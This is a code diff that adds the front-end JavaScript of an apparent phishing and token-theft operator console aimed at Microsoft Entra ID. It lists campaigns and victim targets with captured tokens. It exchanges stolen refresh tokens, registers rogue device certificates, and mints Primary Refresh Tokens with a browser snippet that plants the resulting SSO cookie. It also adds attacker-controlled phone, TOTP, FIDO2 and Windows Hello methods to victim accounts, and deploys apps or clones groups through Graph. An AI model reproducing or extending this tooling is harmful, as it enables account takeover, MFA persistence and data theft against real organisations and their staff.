+  if (m.includes('unauthorized')) return 'Session expired — please log in again.';
+  if (m.includes('forbidden') || m.includes('403')) return 'Access denied — insufficient permissions.';
+  if (m.length > 140) return m.substring(0, 140) + '…';
+  return m;
+}
+
+async function api(method, path, body) {
+  const opts = {method, headers:{'Content-Type':'application/json'}};
+  if (body !== undefined) opts.body = JSON.stringify(body);
+  try {
+    const r = await fetch('/api'+path, opts);
+    if (r.status===401) { showLoginOverlay(); return {error:'Session expired — please log in again.'}; }
+    if (r.status===403) return {error:'Access denied — insufficient permissions.'};
+    if (r.status===404) return {error:'Resource not found.'};
+    if (!r.ok && r.status>=500) return {error:'Server error — check operator logs.'};
+    const data = await r.json();
+    if (data && data.error) data.error = friendlyError(data.error);
+    return data;
+  } catch(e) {
+    if (e.message && (e.message.includes('Failed to fetch') || e.message.includes('NetworkError')))
+      return {error:'Network error — server unreachable.'};
+    return {error:e.message};
+  }
+}
+
+async function apiFetch(path, opts={}) {
+  const r = await fetch('/api'+path, opts);
+  if (r.status===401) { showLoginOverlay(); return null; }
+  return r;
+}
+
+// ─── Navigation ───────────────────────────────────────────────────────────────
+function showSection(name) {
+  document.querySelectorAll('.section-body[id^="sec-"]').forEach(el => el.classList.remove('active'));
+  const el = document.getElementById('sec-'+name);
+  if (el) el.classList.add('active');
+}
+
+function devCertTab(btn, name) {
+  document.querySelectorAll('#sec-devcerts .section-tab').forEach(b=>b.classList.remove('active'));
+  document.querySelectorAll('#sec-devcerts .section-body[id^="devtab-"]').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('devtab-'+name).classList.add('active');
+  if (name==='list') loadDeviceCerts();
+}
+function prtTab(btn, name) {
+  document.querySelectorAll('#sec-prts .section-tab').forEach(b=>b.classList.remove('active'));
+  document.querySelectorAll('#sec-prts .section-body[id^="prttab-"]').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('prttab-'+name).classList.add('active');
+  if (name==='list') loadPRTs();
+  if (name==='use') populatePRTUseSelect();
+}
+function whTab(btn, name) {
+  document.querySelectorAll('#sec-winhello .section-tab').forEach(b=>b.classList.remove('active'));
+  document.querySelectorAll('#sec-winhello .section-body[id^="whtab-"]').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('whtab-'+name).classList.add('active');
+  if (name==='list') loadWinHelloKeys();
+}
+function mfaTab(btn, name) {
+  document.querySelectorAll('#sec-mfa .section-tab').forEach(b=>b.classList.remove('active'));
+  document.querySelectorAll('#sec-mfa .section-body[id^="mfatab-"]').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('mfatab-'+name).classList.add('active');
+}
+function totpTab(btn, name) {
+  document.querySelectorAll('#sec-totp .section-tab').forEach(b=>b.classList.remove('active'));
+  document.querySelectorAll('#sec-totp .section-body[id^="totptab-"]').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('totptab-'+name).classList.add('active');
+  if (name==='codes') loadOTPSecrets();
+}
+
+function escH(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}
+
+// ─── Boot ─────────────────────────────────────────────────────────────────────
+async function bootApp() {
+  loadCampaignsForSelects();
+  loadDeviceCertsForSelects();
+}
+
+async function loadCampaignsForSelects() {
+  const data = await api('GET', '/campaigns');
+  const campaigns = data.campaigns || data || [];
+  const selectors = ['exCampaignId', 'mfaCampaignId', 'gaCampaignId'];
+  selectors.forEach(id => {
+    const sel = document.getElementById(id);
+    if (!sel) return;
+    sel.innerHTML = '<option value="">— select campaign —</option>' +
+      campaigns.map(c=>`<option value="${escH(c.id)}">${escH(c.name)}</option>`).join('');
+  });
+  if (campaigns.length > 0) {
+    document.getElementById('exCampaignId').value = campaigns[0].id;
+    loadExTargets();
+    document.getElementById('mfaCampaignId').value = campaigns[0].id;
+    loadMfaTargets();
+    document.getElementById('gaCampaignId').value = campaigns[0].id;
+    loadGaTargets();
+  }
+}
+
+// tokenMetaCache: campaignId → { targetId → {tenant_id, captured_client_id, ...} }
+const tokenMetaCache = {};
+
+async function _loadTargetsInto(selId, campaignId, metaCacheKey) {
+  if (!campaignId) return;
+  const data = await api('GET', '/campaigns/'+campaignId+'/tokens');
+  const tokens = data.tokens || data || [];
+  // Cache metadata keyed by target_id
+  const map = {};
+  tokens.forEach(t => {
+    const tid = t.targetId || t.target_id;
+    map[tid] = t;
+  });
+  tokenMetaCache[metaCacheKey] = map;
+  const sel = document.getElementById(selId);
+  sel.innerHTML = '<option value="">— select target —</option>' +
+    tokens.map(t => {
+      const tid = t.targetId || t.target_id;
+      const email = t.targetEmail || t.target_email || tid;
+      const tenantHint = t.tenant_id ? ` [${t.tenant_id.slice(0,8)}…]` : '';
+      return `<option value="${escH(tid)}">${escH(email)}${escH(tenantHint)}</option>`;
+    }).join('');
+}
+
+async function loadExTargets() {
+  const cid = document.getElementById('exCampaignId').value;
+  await _loadTargetsInto('exTargetId', cid, 'ex_'+cid);
+  applyExTargetMeta();
+}
+
+async function loadMfaTargets() {
+  const cid = document.getElementById('mfaCampaignId').value;
+  await _loadTargetsInto('mfaTargetId', cid, 'mfa_'+cid);
+  applyMfaTargetMeta();
+}
+
+async function loadGaTargets() {
+  const cid = document.getElementById('gaCampaignId').value;
+  await _loadTargetsInto('gaTargetId', cid, 'ga_'+cid);
+}
+
+// Auto-fill token exchange fields from captured token metadata
+function applyExTargetMeta() {
+  const cid = document.getElementById('exCampaignId').value;
+  const tid = document.getElementById('exTargetId').value;
+  if (!cid || !tid) return;
+  const meta = (tokenMetaCache['ex_'+cid] || {})[tid];
+  if (!meta) return;
+  // Pre-fill client ID with the one that originally captured the token
+  if (meta.captured_client_id) {
+    document.getElementById('exClientId').value = meta.captured_client_id;
+  }
+  // Show tenant context hint
+  const hint = document.getElementById('exTenantHint');
+  if (hint) {
+    hint.textContent = meta.tenant_id
+      ? `tenant: ${meta.tenant_id}  ·  appid: ${meta.captured_client_id||'—'}`
+      : '';
+  }
+}
+
+function applyMfaTargetMeta() {
+  const cid = document.getElementById('mfaCampaignId').value;
+  const tid = document.getElementById('mfaTargetId').value;
+  if (!cid || !tid) return;
+  const meta = (tokenMetaCache['mfa_'+cid] || {})[tid];
+  if (!meta) return;
+  const hint = document.getElementById('mfaTenantHint');
+  if (hint) {
+    hint.textContent = meta.tenant_id
+      ? `tenant: ${meta.tenant_id}  ·  appid: ${meta.captured_client_id||'—'}`
+      : '';
+  }
+}
+
+async function gaCloneGroup() {
+  const cid = document.getElementById('gaCampaignId').value;
+  const tid = document.getElementById('gaTargetId').value;
+  if (!cid || !tid) { alert('Select campaign and target first'); return; }
+  const srcId = document.getElementById('gaCloneSrcId').value.trim();
+  const name  = document.getElementById('gaCloneName').value.trim();
+  const desc  = document.getElementById('gaCloneDesc').value.trim();
+  if (!srcId || !name) { alert('Source Group ID and New Display Name required'); return; }
+  const out = document.getElementById('gaCloneOut');
+  out.style.display = 'block'; out.textContent = 'Running...';
+  const data = await api('POST', `/campaigns/${cid}/graph/${tid}/clone-group`, {source_group_id: srcId, new_display_name: name, description: desc});
+  out.textContent = JSON.stringify(data, null, 2);
+}
+
+async function gaDeployApp() {
+  const cid = document.getElementById('gaCampaignId').value;
+  const tid = document.getElementById('gaTargetId').value;
+  if (!cid || !tid) { alert('Select campaign and target first'); return; }
+  const appName  = document.getElementById('gaAppName').value.trim();
+  const redirect = document.getElementById('gaAppRedirect').value.trim();
+  const scopeStr = document.getElementById('gaAppScopes').value.trim();
+  if (!appName) { alert('App Display Name required'); return; }
+  const scopes = scopeStr ? scopeStr.split(',').map(s=>s.trim()).filter(Boolean) : [];
+  const out = document.getElementById('gaDeployOut');
+  out.style.display = 'block'; out.textContent = 'Deploying...';
+  const data = await api('POST', `/campaigns/${cid}/graph/${tid}/deploy-app`, {display_name: appName, redirect_uri: redirect, requested_scopes: scopes});
+  out.textContent = JSON.stringify(data, null, 2);
+}
+
+async function loadDeviceCertsForSelects() {
+  const data = await api('GET', '/device-certs');
+  const certs = Array.isArray(data) ? data : [];
+  ['prtDevCert','prtIDevCert','whDevCert'].forEach(id => {
+    const sel = document.getElementById(id);
+    if (!sel) return;
+    sel.innerHTML = '<option value="">— none —</option>' +
+      certs.map(c=>`<option value="${escH(c.id)}">${escH(c.label)} (${escH(c.device_id)})</option>`).join('');
+  });
+}
+
+// ─── Token Exchange ───────────────────────────────────────────────────────────
+// clientIDs that work for specific presets where the campaign default (Office d3590ed6)
+// fails with AADSTS65002 (first-party ↔ first-party preauthorization required).
+const presetClientOverrides = {
+  mfa_registration: '1b730954-1685-4b74-9bfd-dac224a7b894', // Azure PowerShell
+};
+
+function applyExchangePreset() {
+  const preset = document.getElementById('exPreset').value;
+  if (!preset || !knownResources[preset]) return;
+  const r = knownResources[preset];
+  document.getElementById('exResource').value = r.v1;
+  document.getElementById('exScope').value = r.v2;
+  if (presetClientOverrides[preset]) {
+    document.getElementById('exClientId').value = presetClientOverrides[preset];
+  }
+}
+
+document.getElementById('exProtocol').addEventListener('change', function() {
+  const v1 = this.value==='v1';
+  document.getElementById('exResourceGroup').style.display = v1 ? '' : 'none';
+  document.getElementById('exScopeGroup').style.display = v1 ? 'none' : '';
+});
+document.getElementById('exScopeGroup').style.display = '';
+document.getElementById('exResourceGroup').style.display = 'none';
+
+async function doExchange() {
+  const cid = document.getElementById('exCampaignId').value;
+  const tid = document.getElementById('exTargetId').value;
+  const out = document.getElementById('exOutput');
+  if (!cid||!tid) { out.textContent='Select a campaign and target.'; return; }
+  out.textContent = '⏳ Exchanging token...';
+  const useV1 = document.getElementById('exProtocol').value==='v1';
+  const result = await api('POST', '/campaigns/'+cid+'/tokens/'+encodeURIComponent(tid)+'/exchange', {
+    clientId: document.getElementById('exClientId').value,
+    resource: document.getElementById('exResource').value,
+    scope: document.getElementById('exScope').value,
+    useV1,
+  });
+  if (result.error) { out.textContent='⚠ '+result.error; return; }
+  out.textContent = JSON.stringify(result, null, 2);
+}
+
+// ─── Tenant Lookup ────────────────────────────────────────────────────────────
+async function doTenantLookup() {
+  const domain = document.getElementById('tenantDomain').value.trim();
+  const out = document.getElementById('tenantOutput');
+  if (!domain) { out.textContent='Enter a domain.'; return; }
+  out.textContent = '⏳ Looking up...';
+  const result = await api('POST', '/util/tenant-lookup', {domain});
+  out.textContent = result.error ? '⚠ '+result.error : `Tenant ID: ${result.tenantId}\nDomain: ${result.domain}`;
+}
+
+// ─── Device Certificates ──────────────────────────────────────────────────────
+async function registerDeviceCert() {
+  const out = document.getElementById('dcOutput');
+  out.textContent='⏳ Registering device...';
+  const result = await api('POST', '/device-certs', {
+    label: document.getElementById('dcLabel').value,
+    accessToken: document.getElementById('dcAccessToken').value,
+    targetDomain: document.getElementById('dcDomain').value,
+    joinType: parseInt(document.getElementById('dcJoinType').value),
+    deviceType: document.getElementById('dcDeviceType').value,
+    osVersion: document.getElementById('dcOSVersion').value,
+  });
+  if (result.error) { out.textContent='⚠ '+result.error; return; }
+  out.textContent='✓ Device registered!\nID: '+result.id+'\nDevice ID: '+result.deviceId;
+  loadDeviceCertsForSelects();
+}
+
+async function importDeviceCert() {
+  const out = document.getElementById('dcIOutput');
+  const result = await api('POST', '/device-certs/import', {
+    label: document.getElementById('dcILabel').value,
+    deviceId: document.getElementById('dcIDeviceId').value,
+    certificate: document.getElementById('dcICert').value,
+    privateKey: document.getElementById('dcIKey').value,
+    targetDomain: document.getElementById('dcIDomain').value,
+    joinType: parseInt(document.getElementById('dcIJoinType').value),
+  });
+  out.textContent = result.error ? '⚠ '+result.error : '✓ Imported: '+result.id;
+  loadDeviceCertsForSelects();
+}
+
+async function loadDeviceCerts() {
+  const el = document.getElementById('dcList');
+  el.innerHTML='⏳ Loading...';
+  const data = await api('GET', '/device-certs');
+  const certs = Array.isArray(data) ? data : [];
+  if (!certs.length) { el.innerHTML='<div style="color:var(--text-dim);font-size:11px">No device certificates stored.</div>'; return; }
+  el.innerHTML = certs.map(c=>`<div class="card">
+    <div class="card-info">
+      <div class="card-label">${escH(c.label)}</div>
+      <div class="card-sub">Device ID: ${escH(c.device_id)} · Join: ${c.join_type===0?'AAD Joined':'Workplace'} · Domain: ${escH(c.target_domain||'—')}</div>
+    </div>
+    <div class="card-actions">
+      <button class="btn btn-sm btn-danger" onclick="deleteDeviceCert('${escH(c.id)}')">✕</button>
+    </div>
+  </div>`).join('');
+  loadDeviceCertsForSelects();
+}
+
+async function deleteDeviceCert(id) {
+  if (!confirm('Delete device certificate?')) return;
+  await apiFetch('/device-certs/'+id, {method:'DELETE'});
+  loadDeviceCerts();
+}
+
+// ─── PRTs ─────────────────────────────────────────────────────────────────────
+async function requestPRT() {
+  const out = document.getElementById('prtOutput');
+  out.textContent='⏳ Requesting PRT...';
+  const result = await api('POST', '/prts/request', {
+    label: document.getElementById('prtLabel').value,
+    deviceCertId: document.getElementById('prtDevCert').value,
+    refreshToken: document.getElementById('prtRefreshToken').value,
+    clientId: document.getElementById('prtClientId').value,
+    targetUpn: document.getElementById('prtUPN').value,
+  });
+  out.textContent = result.error ? '⚠ '+result.error : '✓ PRT obtained!\nID: '+result.id;
+  if (!result.error) loadPRTs();
+}
+
+async function importPRT() {
+  const out = document.getElementById('prtIOutput');
+  const result = await api('POST', '/prts/import', {
+    label: document.getElementById('prtILabel').value,
+    prtToken: document.getElementById('prtIToken').value,
+    sessionKey: document.getElementById('prtISessionKey').value,
+    targetUpn: document.getElementById('prtIUPN').value,
+    tenantId: document.getElementById('prtITenantId').value,
+    deviceCertId: document.getElementById('prtIDevCert').value,
+  });
+  out.textContent = result.error ? '⚠ '+result.error : '✓ Imported: '+result.id;
+}
+
+async function loadPRTs() {
+  const el = document.getElementById('prtList');
+  el.innerHTML='⏳ Loading...';
+  const data = await api('GET', '/prts');
+  const prts = Array.isArray(data) ? data : [];
+  if (!prts.length) { el.innerHTML='<div style="color:var(--text-dim);font-size:11px">No PRTs stored.</div>'; return; }
+  el.innerHTML = prts.map(p=>`<div class="card">
+    <div class="card-info">
+      <div class="card-label">${escH(p.label||p.id)}</div>
+      <div class="card-sub">UPN: ${escH(p.target_upn||'—')} · Tenant: ${escH(p.tenant_id||'—')} · ${new Date(p.created_at).toLocaleString()}</div>
+    </div>
+    <div class="card-actions">
+      <button class="btn btn-sm btn-danger" onclick="deletePRT('${escH(p.id)}')">✕</button>
+    </div>
+  </div>`).join('');
+  populatePRTUseSelect();
+}
+
+async function deletePRT(id) {
+  if (!confirm('Delete PRT?')) return;
+  await apiFetch('/prts/'+id, {method:'DELETE'});
+  loadPRTs();
+}
+
+async function populatePRTUseSelect() {
+  const data = await api('GET', '/prts');
+  const prts = Array.isArray(data) ? data : [];
+  const sel = document.getElementById('prtUseSelect');
+  sel.innerHTML = '<option value="">— select PRT —</option>'+prts.map(p=>`<option value="${escH(p.id)}">${escH(p.label||p.id)} (${escH(p.target_upn||'?')})</option>`).join('');
+}
+
+async function prtGetAccessToken() {
+  const id = document.getElementById('prtUseSelect').value;
+  const out = document.getElementById('prtUseOutput');
+  if (!id) { out.textContent='Select a PRT.'; return; }
+  out.textContent='⏳ Requesting access token from PRT...';
+  const result = await api('POST', '/prts/'+id+'/access-token', {
+    clientId: document.getElementById('prtUseClientId').value,
+    resource: document.getElementById('prtUseResource').value,
+    scope: document.getElementById('prtUseScope').value,
+  });
+  out.textContent = result.error ? '⚠ '+result.error : JSON.stringify(result, null, 2);
+}
+
+async function prtGetCookie() {
+  const id = document.getElementById('prtUseSelect').value;
+  const out = document.getElementById('prtUseOutput');
+  if (!id) { out.textContent='Select a PRT.'; return; }
+  out.textContent='⏳ Generating SSO cookie...';
+  const result = await api('GET', '/prts/'+id+'/cookie');
+  if (result.error) { out.textContent='⚠ '+result.error; return; }
+  out.textContent = `Cookie name: ${result.name}\nValue:\n${result.cookie}\n\nAdd to browser devtools:\ndocument.cookie = "${result.name}=${result.cookie}; domain=login.microsoftonline.com; path=/;"`;
+}
+
+// ─── WinHello ─────────────────────────────────────────────────────────────────
+async function registerWinHello() {
+  const out = document.getElementById('whOutput');
+  out.textContent='⏳ Registering WinHello key...';
+  const result = await api('POST', '/winhello-keys', {
+    label: document.getElementById('whLabel').value,
+    deviceCertId: document.getElementById('whDevCert').value,
+    accessToken: document.getElementById('whAccessToken').value,
+    userId: document.getElementById('whUserId').value,
+  });
+  out.textContent = result.error ? '⚠ '+result.error : '✓ WinHello key registered!\nID: '+result.id+'\nKey ID: '+result.keyId;
+}
+
+async function loadWinHelloKeys() {
+  const el = document.getElementById('whList');
+  el.innerHTML='⏳ Loading...';
+  const data = await api('GET', '/winhello-keys');
+  const keys = Array.isArray(data) ? data : [];
+  if (!keys.length) { el.innerHTML='<div style="color:var(--text-dim);font-size:11px">No WinHello keys stored.</div>'; return; }
+  el.innerHTML = keys.map(k=>`<div class="card">
+    <div class="card-info">
+      <div class="card-label">${escH(k.label)}</div>
+      <div class="card-sub">Key ID: ${escH(k.key_id)} · UPN: ${escH(k.target_upn||'—')}</div>
+    </div>
+    <div class="card-actions">
+      <button class="btn btn-sm btn-danger" onclick="deleteWinHelloKey('${escH(k.id)}')">✕</button>
+    </div>
+  </div>`).join('');
+}
+
+async function deleteWinHelloKey(id) {
+  await apiFetch('/winhello-keys/'+id, {method:'DELETE'});
+  loadWinHelloKeys();
+}
+
+// ─── MFA ──────────────────────────────────────────────────────────────────────
+function mfaPath() {
+  const cid = document.getElementById('mfaCampaignId').value;
+  const tid = document.getElementById('mfaTargetId').value;
+  return '/campaigns/'+cid+'/graph/'+encodeURIComponent(tid)+'/mfa';
+}
+
+async function mfaGetSession() {
+  const out = document.getElementById('mfaOutput');
+  out.textContent='⏳ Getting session context...';
+  const result = await api('POST', mfaPath()+'/session', {});
+  if (result.error) { out.textContent='⚠ '+result.error; return; }
+  document.getElementById('mfaSessionCtx').value = result.sessionCtx;
+  out.textContent='✓ Session context obtained.';
+}
+
+async function mfaListMethods() {
+  const out = document.getElementById('mfaOutput');
+  out.textContent='⏳ Loading MFA methods...';
+  const result = await api('GET', mfaPath()+'/methods');
+  out.textContent = result.error ? '⚠ '+result.error : JSON.stringify(result, null, 2);
+}
+
+function mfaSessionCtx() { return document.getElementById('mfaSessionCtx').value; }
+
+async function mfaAddPhone() {
+  const out = document.getElementById('mfaOutput');
+  const result = await api('POST', mfaPath()+'/add-phone', {
+    phoneType: parseInt(document.getElementById('mfaPhoneType').value),
+    phone: document.getElementById('mfaPhone').value,
+    sessionCtx: mfaSessionCtx(),
+  });
+  out.textContent = result.error ? '⚠ '+result.error : '✓ Phone added:\n'+JSON.stringify(result, null, 2);
+}
+
+async function mfaAddEmail() {
+  const out = document.getElementById('mfaOutput');
+  const result = await api('POST', mfaPath()+'/add-email', {
+    email: document.getElementById('mfaEmail').value,
+    sessionCtx: mfaSessionCtx(),
+  });
+  out.textContent = result.error ? '⚠ '+result.error : '✓ Email added:\n'+JSON.stringify(result, null, 2);
+}
+
+async function mfaAddApp() {
+  const out = document.getElementById('mfaOutput');
+  const result = await api('POST', mfaPath()+'/add-app', {
+    appType: parseInt(document.getElementById('mfaAppType').value),
+    secretKey: document.getElementById('mfaSecretKey').value,
+    sessionCtx: mfaSessionCtx(),
+  });
+  out.textContent = result.error ? '⚠ '+result.error : '✓ App added:\n'+JSON.stringify(result, null, 2);
+}
+
+async function mfaRegisterTOTP() {
+  const out = document.getElementById('mfaOutput');
+  out.textContent='⏳ Registering as Authenticator app...';
+  const result = await api('POST', mfaPath()+'/register-totp', {
+    label: document.getElementById('mfaTotpLabel').value,
+    sessionCtx: mfaSessionCtx(),
+  });
+  if (result.error) { out.textContent='⚠ '+result.error; return; }
+  out.textContent='✓ TOTP registered!\nSecret saved as: '+result.id+'\nSecret: '+result.secret;
+}
+
+async function mfaDeleteMethod() {
+  const out = document.getElementById('mfaOutput');
+  const result = await api('POST', mfaPath()+'/delete', {
+    methodId: document.getElementById('mfaDeleteId').value,
+    sessionCtx: mfaSessionCtx(),
+  });
+  out.textContent = result.error ? '⚠ '+result.error : '✓ Method deleted.';
+}
+
+async function mfaGetRegistered() {
+  const cid = document.getElementById('mfaCampaignId').value;
+  const tid = document.getElementById('mfaTargetId').value;
+  const out = document.getElementById('mfaOutput');
+  if (!cid || !tid) { out.textContent = '⚠ Select campaign and target first.'; return; }
+  out.textContent = '⏳ Loading registered methods from Graph...';
+  const result = await api('GET', '/campaigns/'+cid+'/graph/'+encodeURIComponent(tid)+'/auth-methods');
+  if (result.error) { out.textContent = '⚠ '+result.error; return; }
+  const methods = result.value || result;
+  if (!Array.isArray(methods) || !methods.length) { out.textContent = 'No authentication methods registered.'; return; }
+  const typeLabel = t => ({
+    '#microsoft.graph.passwordAuthenticationMethod':             'Password',
+    '#microsoft.graph.phoneAuthenticationMethod':                'Phone',
+    '#microsoft.graph.emailAuthenticationMethod':                'Email',
+    '#microsoft.graph.microsoftAuthenticatorAuthenticationMethod': 'Microsoft Authenticator',
+    '#microsoft.graph.softwareOathAuthenticationMethod':         'Software OATH / TOTP',
+    '#microsoft.graph.fido2AuthenticationMethod':                'FIDO2 Security Key',
+    '#microsoft.graph.windowsHelloForBusinessAuthenticationMethod': 'Windows Hello for Business',
+    '#microsoft.graph.temporaryAccessPassAuthenticationMethod':  'Temporary Access Pass',
+  })[t] || t;
+  out.textContent = methods.map(m => {
+    const type   = typeLabel(m['@odata.type'] || '');
+    const detail = m.phoneNumber || m.emailAddress || m.displayName || m.model || '';
+    return `[${type}]\n  ID: ${m.id}${detail ? '\n  Detail: '+detail : ''}`;
+  }).join('\n\n');
+}
+
+// ─── FIDO2 / WebAuthn helpers ─────────────────────────────────────────────────
+function b64urlDecode(str) {
+  const pad = (4 - str.length % 4) % 4;
+  const b64 = str.replace(/-/g, '+').replace(/_/g, '/') + '='.repeat(pad);
+  const bin = atob(b64);
+  const arr = new Uint8Array(bin.length);
+  for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
+  return arr.buffer;
+}
+
+function b64urlEncode(buf) {
+  const bytes = new Uint8Array(buf instanceof ArrayBuffer ? buf : buf.buffer || buf);
+  let bin = '';
+  for (const b of bytes) bin += String.fromCharCode(b);
+  return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+}
+
+function fido2SetStep(n) {
+  const labels = [
+    'Step 1: Get creation options from mysignins',
+    'Step 2: Touch / activate your security key',
+    'Step 3: Send attestation to mysignins',
+  ];
+  for (let i = 0; i < 3; i++) {
+    const el = document.getElementById('mfaFido2Step'+(i+1));
+    if (!el) continue;
+    if (i < n)      { el.style.color = 'var(--accent3)'; el.textContent = '✓ '+labels[i]; }
+    else if (i === n) { el.style.color = 'var(--accent)';  el.textContent = '▶ '+labels[i]; }
+    else             { el.style.color = 'var(--text-dim)'; el.textContent = '◦ '+labels[i]; }
+  }
+}
+
+async function mfaRegisterFIDO2() {
+  const out = document.getElementById('mfaOutput');
+  const btn = document.getElementById('mfaFido2Btn');
+  const stepsEl = document.getElementById('mfaFido2Steps');
+  stepsEl.style.display = '';
+  btn.disabled = true;
+  fido2SetStep(0);
+
+  try {
+    // Step 1 — get challenge from mysignins via server
+    out.textContent = '⏳ Getting FIDO2 challenge from mysignins...';
+    const keyName = document.getElementById('mfaFido2Name').value.trim() || 'Security Key';
+    const begin = await api('POST', mfaPath()+'/fido2/begin', { keyName, sessionCtx: mfaSessionCtx() });
+    if (begin.error) throw new Error(begin.error);
+
+    // Build PublicKeyCredentialCreationOptions — decode base64url fields
+    const opts = {
+      challenge: b64urlDecode(begin.challenge),
+      rp: begin.rp || { id: begin.rpId || window.location.hostname, name: begin.rpName || 'Microsoft' },
+      user: {
+        id:          b64urlDecode(begin.user?.id || begin.userId || btoa('user')),
+        name:        begin.user?.name        || begin.userName        || 'user',
+        displayName: begin.user?.displayName || begin.userDisplayName || 'user',
+      },
+      pubKeyCredParams: begin.pubKeyCredParams || [
+        { type: 'public-key', alg: -7   },  // ES256
+        { type: 'public-key', alg: -257 },  // RS256
+      ],
+      timeout:               begin.timeout || 120000,
+      attestation:           begin.attestation || 'none',
+      authenticatorSelection: begin.authenticatorSelection || {
+        authenticatorAttachment: 'cross-platform',
+        requireResidentKey: false,
+        userVerification: 'preferred',
+      },
+      excludeCredentials: (begin.excludeCredentials || []).map(c => ({
+        type: 'public-key', id: b64urlDecode(c.id),
+      })),
+    };
+
+    // Step 2 — browser prompts user to interact with the key
+    fido2SetStep(1);
+    out.textContent = '⏳ Touch / tap your security key when it blinks...';
+    const cred = await navigator.credentials.create({ publicKey: opts });
+
+    // Step 3 — send attestation to server → mysignins
+    fido2SetStep(2);
+    out.textContent = '⏳ Sending attestation to mysignins...';
+    const attestation = {
+      id:    cred.id,
+      rawId: b64urlEncode(cred.rawId),
+      type:  cred.type,
+      response: {
+        clientDataJSON:    b64urlEncode(cred.response.clientDataJSON),
+        attestationObject: b64urlEncode(cred.response.attestationObject),
+      },
+    };
+    const complete = await api('POST', mfaPath()+'/fido2/complete', {
+      verificationId:      begin.verificationId || begin.id || '',
+      sessionCtx:          mfaSessionCtx(),
+      attestationResponse: attestation,
+    });
+    if (complete.error) throw new Error(complete.error);
+
+    // All steps done
+    for (let i = 1; i <= 3; i++) {
+      const el = document.getElementById('mfaFido2Step'+i);
+      if (el) el.style.color = 'var(--accent3)';
+    }
+    out.textContent = '✓ Security key registered!\n\n'+JSON.stringify(complete, null, 2);
+  } catch(e) {
+    out.textContent = '⚠ FIDO2 error: '+(e.message || String(e));
+  } finally {
+    btn.disabled = false;
+  }
+}
+
+// ─── TOTP ─────────────────────────────────────────────────────────────────────
+async function loadOTPSecrets() {
+  const el = document.getElementById('totpList');
+  const data = await api('GET', '/otp-secrets');
+  const secrets = Array.isArray(data) ? data : [];
+  if (!secrets.length) { el.innerHTML='<div style="color:var(--text-dim);font-size:11px">No OTP secrets stored.</div>'; return; }
+  el.innerHTML = secrets.map(s=>`<div class="card" style="flex-direction:column;align-items:stretch">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+      <span class="card-label">${escH(s.label)}</span>
+      <button class="btn btn-sm btn-danger" onclick="deleteOTPSecret('${escH(s.id)}')">✕</button>
+    </div>
+    <div class="totp-code" id="totpCode-${escH(s.id)}">——</div>
+    <button class="btn btn-sm btn-primary" onclick="genTOTP('${escH(s.id)}')">⟳ Generate Code</button>
+  </div>`).join('');
+  // Auto-generate all
+  secrets.forEach(s => genTOTP(s.id));
+}
+
+async function genTOTP(id) {
+  const el = document.getElementById('totpCode-'+id);
+  if (!el) return;
+  const r = await api('GET', '/otp-secrets/'+id+'/code');
+  el.textContent = r.code || '——';
+}
+
+async function addOTPSecret() {
+  const result = await api('POST', '/otp-secrets', {
+    label: document.getElementById('totpLabel').value,
+    secret: document.getElementById('totpSecret').value,
+  });
+  if (!result.error) { totpTab(document.querySelector('#sec-totp .section-tab'), 'codes'); loadOTPSecrets(); }
+}
+
+async function deleteOTPSecret(id) {
+  await apiFetch('/otp-secrets/'+id, {method:'DELETE'});
+  loadOTPSecrets();
+}
+
+// ─── Init ─────────────────────────────────────────────────────────────────────
+bootApp();
+document.getElementById('exCampaignId').addEventListener('change', loadExTargets);
+document.getElementById('exTargetId').addEventListener('change', applyExTargetMeta);
+document.getElementById('mfaCampaignId').addEventListener('change', loadMfaTargets);
+document.getElementById('mfaTargetId').addEventListener('change', applyMfaTargetMeta);
+</script>
+</body>
+</html>
